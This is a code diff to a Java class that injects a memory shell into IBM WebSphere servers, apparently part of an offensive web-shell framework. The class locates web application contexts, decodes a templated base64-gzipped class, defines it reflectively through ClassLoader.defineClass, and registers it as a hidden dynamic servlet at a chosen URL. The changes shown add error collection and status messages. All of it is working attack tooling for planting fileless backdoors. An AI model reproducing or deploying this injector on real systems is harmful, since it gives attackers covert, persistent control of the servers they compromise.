@@ -3,6 +3,7 @@ package com.reajason.javaweb.memshell.injector.websphere;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.io.PrintStream;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.util.ArrayList;
@@ -15,17 +16,8 @@ import java.util.zip.GZIPInputStream;
  * @since 2024/12/21
  */
 public class WebSphereServletInjector {
-    public WebSphereServletInjector() {
-        try {
-            List<Object> contexts = getContext();
-            for (Object context : contexts) {
-                Object listener = getShell(context);
-                inject(context, listener);
-            }
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
+
+    private String msg = "";
 
     public String getUrlPattern() {
         return "{{urlPattern}}";
@@ -37,6 +29,44 @@ public class WebSphereServletInjector {
 
     public String getBase64String() throws IOException {
         return "{{base64Str}}";
+    }
+    public WebSphereServletInjector() {
+        List<Object> contexts = null;
+        try {
+            contexts = getContext();
+        } catch (Throwable throwable) {
+            msg += "context error: " + getErrorMessage(throwable);
+        }
+        if (contexts != null) {
+            for (Object context : contexts) {
+                msg += ("context: [" + getContextRoot(context) + "] ");
+                try {
+                    Object shell = getShell(context);
+                    inject(context, shell);
+                    msg += "[" + getUrlPattern() + "] ready\n";
+                } catch (Throwable e) {
+                    msg += "failed " + getErrorMessage(e) + "\n";
+                }
+            }
+        }
+        System.out.println(msg);
+    }
+
+    @SuppressWarnings("all")
+    private String getContextRoot(Object context) {
+        String r = null;
+        try {
+            r = (String) invokeMethod(context, "getContextPath", null, null);
+        } catch (Exception ignored) {
+        }
+        String c = context.getClass().getName();
+        if (r == null) {
+            return c;
+        }
+        if (r.isEmpty()) {
+            return c + "(/)";
+        }
+        return c + "(" + r + ")";
     }
 
     public List<Object> getContext() throws Exception {
@@ -76,26 +106,31 @@ public class WebSphereServletInjector {
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
         ClassLoader classLoader = getWebAppClassLoader(context);
+        Class<?> clazz = null;
         try {
-            return classLoader.loadClass(getClassName()).newInstance();
+            clazz = classLoader.loadClass(getClassName());
         } catch (Exception e) {
             byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
             Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
-            Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
-            return clazz.newInstance();
+            clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
         }
+        msg += "[" + classLoader.getClass().getName() + "] ";
+        return clazz.newInstance();
     }
 
     public void inject(Object context, Object servlet) throws Exception {
         Object config = getFieldValue(context, "config");
         Object servletInfo = invokeMethod(config, "getServletInfo", new Class[]{String.class}, new Object[]{getClassName()});
         if (servletInfo != null) {
-            System.out.println("servlet already injected");
             return;
         }
         invokeMethod(context, "addDynamicServlet", new Class[]{String.class, String.class, String.class, Properties.class}, new Object[]{getClassName(), getClassName(), getUrlPattern(), null});
-        System.out.println("servlet injected successfully");
+    }
+
+    @Override
+    public String toString() {
+        return msg;
     }
 
     @SuppressWarnings("all")
@@ -143,7 +178,7 @@ public class WebSphereServletInjector {
                 clazz = clazz.getSuperclass();
             }
         }
-        throw new NoSuchFieldException();
+        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
     }
 
     @SuppressWarnings("all")
@@ -167,5 +202,20 @@ public class WebSphereServletInjector {
         }
         method.setAccessible(true);
         return method.invoke(obj instanceof Class ? null : obj, param);
+    }
+
+    @SuppressWarnings("all")
+    private String getErrorMessage(Throwable throwable) {
+        PrintStream printStream = null;
+        try {
+            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+            printStream = new PrintStream(outputStream);
+            throwable.printStackTrace(printStream);
+            return outputStream.toString();
+        } finally {
+            if (printStream != null) {
+                printStream.close();
+            }
+        }
     }
 }
